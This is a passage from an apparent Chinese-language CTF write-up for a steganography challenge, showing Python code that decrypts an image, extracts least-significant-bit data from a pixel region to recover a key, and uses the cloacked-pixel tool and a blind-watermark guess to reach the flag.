        decrypted_image.putpixel((x, y), (decrypted_rgb[0], decrypted_rgb[1], decrypted_rgb[2]))

decrypted_image.save('decrypted_image.png')
```

<img src="https://c.img.dasctf.com/LightPicture/2024/10/3e408762c5b14ec0.png" width="976" title="null" crop="0,0,1,1" id="dFpdo" class="ne-image">

解密成功，然后再用stegslove看一下lsb隐写情况

<img src="https://c.img.dasctf.com/LightPicture/2024/10/1c957f258d37d812.png" width="675" title="null" crop="0,0,1,1" id="HwYwi" class="ne-image">

先确认小块部分的隐写区域（1243，1243）（1257，1254）

```plain
from PIL import Image


def extract_lsb(image_path, start_x, start_y, end_x, end_y):

    img = Image.open(image_path)
    pixels = img.load()

    binary_data = ""

    for y in range(start_y, end_y + 1):
        for x in range(start_x, end_x + 1):

            pixel = pixels[x, y]

            if len(pixel) == 4:
                r, g, b, _ = pixel 
            else:
                r, g, b = pixel 

            binary_data += bin(r)[-1]  # Red channel LSB
            binary_data += bin(g)[-1]  # Green channel LSB
            binary_data += bin(b)[-1]  # Blue channel LSB

    hidden_data = ""
    for i in range(0, len(binary_data), 8):
        byte = binary_data[i:i + 8]
        hidden_data += chr(int(byte, 2))

    return hidden_data

image_path = "decrypted_image.png"
start_x, start_y = 1243, 1243
end_x, end_y = 1257,1254
hidden_message = extract_lsb(image_path, start_x, start_y, end_x, end_y)

print("Hidden Message:", hidden_message)
```

<img src="https://c.img.dasctf.com/LightPicture/2024/10/abab289522aa78eb.png" width="842" title="null" crop="0,0,1,1" id="yeqj5" class="ne-image">

得到加密lsb的key

```plain
python2 lsb.py extract '/root/cloacked-pixel-master/decrypted_image.png'  "11" Oversized_chips
```

得到的图片

<img src="https://c.img.dasctf.com/LightPicture/2024/10/92f68040f8549ebd.png" width="152" title="null" crop="0,0,1,1" id="UZ0wr" class="ne-image">

水 猜测盲水印

<img src="https://c.img.dasctf.com/LightPicture/2024/10/c353fdc69ee4ef95.png" width="780" title="null" crop="0,0,1,1" id="K9gSe" class="ne-image">

得到flag


